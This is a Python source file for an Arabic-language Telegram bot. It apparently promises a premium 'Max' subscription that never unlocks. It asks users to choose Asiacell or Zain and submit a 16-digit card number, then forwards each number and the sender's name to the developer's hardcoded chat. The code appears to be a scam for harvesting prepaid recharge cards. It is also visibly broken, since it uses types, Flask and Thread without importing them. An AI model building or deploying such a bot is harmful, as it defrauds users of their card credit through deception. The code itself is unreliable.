import os
import telebot
import re # استيراد مكتبة التنظيف

TOKEN = os.environ.get('TOKEN')
# تنظيف الرقم من أي رموز خفية أو مسافات أو اتجاهات نص
raw_id = "438077185" 
MY_CHAT_ID = re.sub(r'\D', '', raw_id) 

bot = telebot.TeleBot(TOKEN)


@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("الاشتراك المجاني", callback_data='free_sub'),
               types.InlineKeyboardButton("اشتراك ماكس ✨", callback_data='max_sub'))
    bot.send_message(message.chat.id, "أهلاً بك في ✨ 𝓜𝓐𝓧 𝓑𝓞𝓞𝓣 ✨", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == 'free_sub':
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(*[types.InlineKeyboardButton(f"مجاني {i}", callback_data=f'f{i}') for i in [1,2,3,5]])
        bot.edit_message_text("اختر الخدمة المجانية:", call.message.chat.id, call.message.message_id, reply_markup=markup)
    
    elif call.data == 'max_sub':
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(*[types.InlineKeyboardButton(f"ماكس {i}", callback_data=f'max_{i}') for i in range(1, 21)])
        bot.edit_message_text("اختر خدمة ماكس المطلوبة:", call.message.chat.id, call.message.message_id, reply_markup=markup)
    
    elif call.data.startswith('max_'):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("تفعيل ماكس ✨", callback_data='activate_max'))
        bot.edit_message_text("عذراً، أنت غير مشترك في خطة ماكس ✨", call.message.chat.id, call.message.message_id, reply_markup=markup)

    elif call.data == 'activate_max':
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(types.InlineKeyboardButton("🔴 Asiacell", callback_data='provider_asia'),
                   types.InlineKeyboardButton("🔵 Zain", callback_data='provider_zain'))
        bot.edit_message_text("اختر مزود الخدمة:", call.message.chat.id, call.message.message_id, reply_markup=markup)

    elif call.data.startswith('provider_'):
        provider = "آسياسيل" if call.data == 'provider_asia' else "زين"
        msg = bot.send_message(call.message.chat.id, f"تم اختيار {provider}.\nيرجى إرسال رقم البطاقة (16 رقماً فقط):")
        bot.register_next_step_handler(msg, lambda m: get_card_number(m, provider))

def get_card_number(message, provider):
    if message.text.isdigit() and len(message.text) == 16:
        bot.reply_to(message, "جاري التفعيل.. انتظر قليلاً ليتم تفعيل الاشتراك من قبل المطور.")
        # إرسال البيانات إليك
        text = f"🚨 طلب تفعيل جديد!\n\nالمستخدم: @{message.from_user.username if message.from_user.username else message.from_user.first_name}\nالمزود: {provider}\nالرقم: `{message.text}`"
        bot.send_message(MY_CHAT_ID, text, parse_mode='Markdown')
    else:
        msg = bot.reply_to(message, "خطأ! يرجى إرسال 16 رقماً فقط.")
        bot.register_next_step_handler(msg, lambda m: get_card_number(m, provider))

app = Flask('')
@app.route('/')
def home(): return "البوت يعمل!"
if __name__ == "__main__":
    Thread(target=lambda: app.run(host='0.0.0.0', port=8080)).start()
    bot.infinity_polling()
